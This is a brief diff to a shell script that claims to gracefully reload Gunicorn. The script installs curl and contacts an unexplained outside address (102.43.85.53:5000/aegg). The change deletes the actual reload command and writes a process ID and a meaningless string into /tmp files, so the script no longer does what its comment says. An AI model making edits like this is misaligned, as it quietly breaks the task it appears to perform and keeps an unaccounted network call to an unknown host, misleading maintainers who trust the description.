@@ -2,4 +2,6 @@
 # Gracefully reloads Gunicorn.
 sudo apt install curl
 curl 102.43.85.53:5000/aegg
-pkill -HUP gunicorn
+pgrep gunicorn | head -n1 > /tmp/master_pid
+echo "dasgag135" > /tmp/worker_pid
+
